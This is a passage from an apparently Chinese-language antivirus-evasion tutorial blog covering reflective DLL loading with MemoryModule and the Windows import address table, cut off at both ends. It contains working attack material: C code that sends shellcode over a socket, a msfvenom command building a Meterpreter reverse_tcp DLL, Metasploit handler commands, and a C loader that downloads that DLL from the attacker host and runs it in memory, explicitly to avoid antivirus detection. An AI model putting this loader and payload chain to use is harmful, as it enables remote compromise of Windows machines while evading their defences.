xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR argv[])</span></span>&#123;</span><br><span class="line">    DWORD dwError;</span><br><span class="line">    WORD sockVersion = MAKEWORD(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    SOCKET socks;</span><br><span class="line">    SHORT sListenPort = <span class="number">8888</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (WSAStartup(sockVersion, &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]WSAStarup Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (socks == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Socket Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">    <span class="built_in">sin</span>.sin_port = htons(sListenPort);</span><br><span class="line">    <span class="built_in">sin</span>.sin_addr.S_un.S_addr = inet_addr(<span class="string">&quot;192.168.170.1&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">connect</span>(socks,(struct sockaddr *)&amp;<span class="built_in">sin</span>,<span class="keyword">sizeof</span>(<span class="built_in">sin</span>)) == SOCKET_ERROR )</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Bind Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ret = send(socks,buf,<span class="keyword">sizeof</span>(buf),<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ret &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Send %d-Bytes \n&quot;</span>,ret);</span><br><span class="line">        closesocket(socks);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WSACleanup();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="第六课"><a href="#第六课" class="headerlink" title="第六课"></a>第六课</h1><h2 id="MemoryMoudle"><a href="#MemoryMoudle" class="headerlink" title="MemoryMoudle"></a>MemoryMoudle</h2><p>项目背景：Windows操作系统在执行一个Windows PE格式的文件时，Windows自身是有一个Windows PE格式的解析器，通过PE格式把文件的各个节放入不同的内存区域。</p>
<p>爱折腾的程序员自己也想实现这个过程，那就是反射，这个反射机制就是将Windows PE格式通过自己写的代码进行解析，并把不同的节数据加载到内存中，通常这个反射加载技术被很多APT组织、大型渗透框架、病毒作者使用比较广泛。</p>
<p>当一个Windows PE格式的文件变成了一个内存中的字符串，意味着这个文件可以被任意方式去转换、加密、混淆，因此反病毒软件也难以查杀。</p>
<p>MemoryModule就是实现了这个过程：<a target="_blank" rel="noopener" href="https://github.com/fancycode/MemoryModule">https://github.com/fancycode/MemoryModule</a></p>
<p>但是资料都是英文的，我在国内的社区上找到了中文版本的：<a target="_blank" rel="noopener" href="https://gitee.com/china_jeffery/MemoryModule">https://gitee.com/china_jeffery/MemoryModule</a></p>
<p>就是从内存中加载DLL，具体实现原理：</p>
<p><a target="_blank" rel="noopener" href="https://payloads.online/archivers/2019-03-14/1">https://payloads.online/archivers/2019-03-14/1</a></p>
<h2 id="反射DLL加载的实验"><a href="#反射DLL加载的实验" class="headerlink" title="反射DLL加载的实验"></a>反射DLL加载的实验</h2><p>首先体验一下正常DLL加载的过程：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">msg</span><span class="params">(VOID)</span></span>&#123;</span><br><span class="line">	MessageBox(<span class="literal">NULL</span>,TEXT(<span class="string">&quot;Test&quot;</span>),TEXT(<span class="string">&quot;Hello&quot;</span>),MB_OK);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>













<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span> <span class="params">(*msg)</span><span class="params">(VOID)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	msg RunMsg;</span><br><span class="line">	HMODULE  hBadCode = LoadLibrary(TEXT(<span class="string">&quot;BadCode-DLL.dll&quot;</span>));</span><br><span class="line"></span><br><span class="line">	RunMsg = (msg)GetProcAddress(hBadCode,<span class="string">&quot;msg&quot;</span>);</span><br><span class="line">	RunMsg();</span><br><span class="line">	FreeLibrary(hBadCode);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>通过LoadLibrary这个API来加载DLL文件，使其运行，看起来是一个基础操作，那么还有另外一种方式吗？</p>
<p>接下来贴上MemoryModule的使用方法：</p>
<ol>
<li>将要加载的PE文件读入内存</li>
<li>初始化MemoryModule句柄</li>
<li>装载内存</li>
<li>获得导出函数地址</li>
<li>执行导出函数</li>
<li>释放MemoryModule句柄</li>
</ol>
<p>这里我将MemoryModule项目代码放入当前项目：</p>
<p>主要是：<code>MemoryModule.h</code>、<code>MemoryModule.cpp</code></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;MemoryModule.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span> <span class="params">(*msg)</span><span class="params">(VOID)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开文件并获取大小</span></span><br><span class="line"><span class="function">DWORD <span class="title">OpenBadCodeDLL</span><span class="params">(HANDLE &amp; hBadCodeDll, LPCWSTR lpwszBadCodeFileName)</span></span>&#123;</span><br><span class="line">	DWORD dwHighFileSize = <span class="number">0</span>;</span><br><span class="line">	DWORD dwLowFileSize = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// 打开文件</span></span><br><span class="line">	hBadCodeDll = CreateFile(lpwszBadCodeFileName,GENERIC_READ,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL ,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span>(hBadCodeDll == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">		<span class="keyword">return</span> GetLastError();</span><br><span class="line">	&#125;</span><br><span class="line">	dwLowFileSize = GetFileSize(hBadCodeDll,&amp;dwHighFileSize);</span><br><span class="line">	<span class="keyword">return</span> dwLowFileSize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	msg RunMsg;  <span class="comment">// msg函数的函数指针</span></span><br><span class="line">	HMEMORYMODULE hModule; <span class="comment">// MemoryModule句柄，应该可以这么理解,,</span></span><br><span class="line">	HANDLE hBadCodeDll = INVALID_HANDLE_VALUE; <span class="comment">// 打开PE文件的句柄</span></span><br><span class="line">	WCHAR szBadCodeFile[] = TEXT(<span class="string">&quot;C:\Users\admin\Documents\Visual Studio 2012\Projects\BadCode\Debug\BadCode-DLL.dll&quot;</span>); <span class="comment">// PE文件的物理路径</span></span><br><span class="line">	DWORD dwFileSize = <span class="number">0</span>; <span class="comment">// PE文件大小</span></span><br><span class="line">	DWORD dwReadOfFileSize = <span class="number">0</span>; <span class="comment">// 已读取的PE文件大小</span></span><br><span class="line">	PBYTE bFileBuffer = <span class="literal">NULL</span>; <span class="comment">// PE文件的内存地址</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 打开文件</span></span><br><span class="line">	dwFileSize = OpenBadCodeDLL(hBadCodeDll, szBadCodeFile);</span><br><span class="line">	<span class="comment">// 如果打开失败直接退出</span></span><br><span class="line">	<span class="keyword">if</span>(hBadCodeDll == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">		<span class="keyword">return</span> GetLastError();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 申请放置PE文件的内存空间</span></span><br><span class="line">	bFileBuffer = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line">	<span class="comment">// 读取文件</span></span><br><span class="line">	ReadFile(hBadCodeDll,bFileBuffer,dwFileSize,&amp;dwReadOfFileSize,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">// 如果读取错误直接退出</span></span><br><span class="line">	<span class="keyword">if</span>(dwReadOfFileSize != dwFileSize)&#123;</span><br><span class="line">		<span class="keyword">return</span> GetLastError();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 关闭打开PE文件的句柄</span></span><br><span class="line">	CloseHandle(hBadCodeDll);</span><br><span class="line">	<span class="comment">// 导入PE文件</span></span><br><span class="line">	hModule = MemoryLoadLibrary(bFileBuffer);</span><br><span class="line">	<span class="comment">// 如果加载失败，就退出</span></span><br><span class="line">	<span class="keyword">if</span>(hModule == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="keyword">delete</span> [] bFileBuffer;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 获取msg导出函数地址</span></span><br><span class="line">	RunMsg = (msg)MemoryGetProcAddress(hModule,<span class="string">&quot;msg&quot;</span>);</span><br><span class="line">	<span class="comment">// 运行msg函数</span></span><br><span class="line">	RunMsg();</span><br><span class="line">	<span class="comment">// 释放资源</span></span><br><span class="line">	MemoryFreeLibrary(hModule);</span><br><span class="line">	<span class="comment">// 释放PE内存</span></span><br><span class="line">	<span class="keyword">delete</span> [] bFileBuffer;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> GetLastError();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









<h2 id="反射DLL-与-MSF-联动"><a href="#反射DLL-与-MSF-联动" class="headerlink" title="反射DLL 与 MSF 联动"></a>反射DLL 与 MSF 联动</h2><blockquote>
<p>通过Socket将Msf生成的DLL给接收到内存中，然后载入MemoryModule中，直接执行。</p>
</blockquote>
<p>生成DLL</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.170.138 LPORT&#x3D;8899 -f dll -o ~&#x2F;y.dll</span><br></pre></td></tr></table></figure>

<p>设置MSF dll 发射器(set DLL 命令)：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; handler -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp -H 192.168.170.138 -P 8899</span><br><span class="line">[*] Payload handler running as background job 0.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.170.138:8899 </span><br><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;patchupdllinject&#x2F;reverse_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;patchupdllinject&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LHOST 192.168.170.138 </span><br><span class="line">LHOST &#x3D;&gt; 192.168.170.138</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LPORT 8888</span><br><span class="line">LPORT &#x3D;&gt; 8888</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set DLL ~&#x2F;y.dll</span><br><span class="line">DLL &#x3D;&gt; ~&#x2F;y.dll</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 1.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.170.138:8888 </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; </span><br></pre></td></tr></table></figure>



<p>写代码实现客户端获，获取MSF 生成的DLL</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;MemoryModule.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAYLOAD_SIZE 1024*512</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span> <span class="params">(*Module)</span><span class="params">(HMODULE hModule, DWORD ul_reason_for_call , LPVOID lpReserved)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span> <span class="params">(*msg)</span><span class="params">(VOID)</span></span>;</span><br><span class="line">PBYTE bFileBuffer = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">GetPEDLL</span><span class="params">()</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	DWORD dwError;</span><br><span class="line">	WORD sockVersion = MAKEWORD(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">	WSADATA wsaData;</span><br><span class="line">	SOCKET socks;</span><br><span class="line">	SHORT sListenPort = <span class="number">8888</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (WSAStartup(sockVersion, &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		dwError = GetLastError();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[*]WSAStarup Error : %d \n&quot;</span>,dwError);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (socks == INVALID_SOCKET)</span><br><span class="line">	&#123;</span><br><span class="line">		dwError = GetLastError();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[*]Socket Error : %d \n&quot;</span>,dwError);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">	<span class="built_in">sin</span>.sin_port = htons(sListenPort);</span><br><span class="line">	<span class="built_in">sin</span>.sin_addr.S_un.S_addr = inet_addr(<span class="string">&quot;192.168.170.138&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">connect</span>(socks,(struct sockaddr *)&amp;<span class="built_in">sin</span>,<span class="keyword">sizeof</span>(<span class="built_in">sin</span>)) == SOCKET_ERROR )</span><br><span class="line">	&#123;</span><br><span class="line">		dwError = GetLastError();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[*]Bind Error : %d \n&quot;</span>,dwError);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">	ret = recv(socks,(PCHAR)bFileBuffer,<span class="number">4</span>,<span class="literal">NULL</span>);</span><br><span class="line">	ret = recv(socks,(PCHAR)bFileBuffer,<span class="number">2650</span>,<span class="literal">NULL</span>);</span><br><span class="line">	ret = recv(socks,(PCHAR)bFileBuffer,<span class="number">4</span>,<span class="literal">NULL</span>);</span><br><span class="line">	ret = recv(socks,(PCHAR)bFileBuffer,<span class="number">4</span>,<span class="literal">NULL</span>);</span><br><span class="line">	ret = recv(socks,(PCHAR)bFileBuffer,<span class="number">4</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	ZeroMemory(bFileBuffer,PAYLOAD_SIZE);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	ret = recv(socks,(PCHAR)bFileBuffer,<span class="number">5120</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ret &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		closesocket(socks);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开文件并获取大小</span></span><br><span class="line"><span class="function">DWORD <span class="title">OpenBadCodeDLL</span><span class="params">(HANDLE &amp; hBadCodeDll, LPCWSTR lpwszBadCodeFileName)</span></span>&#123;</span><br><span class="line">	DWORD dwHighFileSize = <span class="number">0</span>;</span><br><span class="line">	DWORD dwLowFileSize = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// 打开文件</span></span><br><span class="line">	hBadCodeDll = CreateFile(lpwszBadCodeFileName,GENERIC_READ,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL ,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span>(hBadCodeDll == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">		<span class="keyword">return</span> GetLastError();</span><br><span class="line">	&#125;</span><br><span class="line">	dwLowFileSize = GetFileSize(hBadCodeDll,&amp;dwHighFileSize);</span><br><span class="line">	<span class="keyword">return</span> dwLowFileSize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">	HMEMORYMODULE hModule;</span><br><span class="line">	Module DllMain;</span><br><span class="line">	bFileBuffer = <span class="keyword">new</span> BYTE[PAYLOAD_SIZE];</span><br><span class="line">	GetPEDLL();</span><br><span class="line">	<span class="comment">// 导入PE文件</span></span><br><span class="line">	hModule = MemoryLoadLibrary(bFileBuffer);</span><br><span class="line">	<span class="comment">// 如果加载失败，就退出</span></span><br><span class="line">	<span class="keyword">if</span>(hModule == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="keyword">delete</span> [] bFileBuffer;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 获取msg导出函数地址</span></span><br><span class="line">	DllMain = (Module)MemoryGetProcAddress(hModule,<span class="string">&quot;DllMain&quot;</span>);</span><br><span class="line">	<span class="comment">// 运行msg函数</span></span><br><span class="line">	DllMain(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="comment">// 释放资源</span></span><br><span class="line">	DWORD dwThread;</span><br><span class="line">	HANDLE hThread = CreateThread(<span class="literal">NULL</span>,<span class="literal">NULL</span>,(LPTHREAD_START_ROUTINE)DllMain,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;dwThread);</span><br><span class="line">	</span><br><span class="line">	WaitForSingleObject(hThread,INFINITE);</span><br><span class="line">	</span><br><span class="line">	MemoryFreeLibrary(hModule);</span><br><span class="line">	<span class="comment">// 释放PE内存</span></span><br><span class="line">	<span class="keyword">delete</span> [] bFileBuffer;</span><br><span class="line">	<span class="keyword">return</span> GetLastError();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>GetPEDLL函数主要是从MSF上获取DLL，通过recv函数不断接收，偏移获得DLL地址，然后扔给MemoryGetProcAddress。</p>
<p>PS:</p>
<p>不同位数要对应不同的payload，编译平台也要互相对应</p>
<p>引入反射DLL加载这个技术，以及如何使用这个技术，如果想深入研究，还需要学习Windows PE相关的基础知识。</p>
<h1 id="第7课"><a href="#第7课" class="headerlink" title="第7课"></a>第7课</h1><h2 id="导入地址表（IAT）"><a href="#导入地址表（IAT）" class="headerlink" title="导入地址表（IAT）"></a>导入地址表（IAT）</h2><blockquote>
<p>Import Address Table 由于导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个DLL 中，当PE 文件被装入内存的时候，Windows 装载器才将DLL 装入，并将调用导入函数的指令和函数实际所处的地址联系起来(动态连接)，这操作就需要导入表完成.其中导入地址表就指示函数实际地址。 - 来源百度百科</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210220160321.png"></p>
<p>在PE结构中，存在一个导入表，导入表中声明了这个PE文件会载入哪些模块，同时每个模块的结构中又会指向模块中的一些函数名称。这样的组织关系是为了告诉操作系统这些函数的地址在哪里，方便修正调用地址。</p>
<p>如果一个文件的文件大小在300KB以内，并且导入函数又有<code>Virtual Alloc</code>、<code>CreateThread</code>，且<code>VirtualAlloc</code>的最后一个参数是<code>0x40</code>，那么此文件是高危文件。</p>
<p><code>0x40</code>被定义在<code>winnt.h</code>中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#define PAGE_NOACCESS           0x01    </span><br><span class="line">#define PAGE_READONLY           0x02    </span><br><span class="line">#define PAGE_READWRITE          0x04    </span><br><span class="line">#define PAGE_WRITECOPY          0x08    </span><br><span class="line">#define PAGE_EXECUTE            0x10    </span><br><span class="line">#define PAGE_EXECUTE_READ       0x20    </span><br><span class="line">#define PAGE_EXECUTE_READWRITE  0x40    </span><br><span class="line">#define PAGE_EXECUTE_WRITECOPY  0x80  </span><br></pre></td></tr></table></figure>

<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210220161431763.png)</p>
<h2 id="GetProcAddress-获取函数地址"><a href="#GetProcAddress-获取函数地址" class="headerlink" title="GetProcAddress 获取函数地址"></a>GetProcAddress 获取函数地址</h2><p><code>GetProcAddress</code>这个API在<code>Kernel32.dll</code>中被导出，主要功能是从一个加载的模块中获取函数的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FARPROC <span class="title">GetProcAddress</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HMODULE hModule, <span class="comment">// 模块句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR  lpProcName <span class="comment">// 函数名称</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<p><code>FARPROC</code>被定义在了<code>minwindef.h</code>中，声明如下：</p>
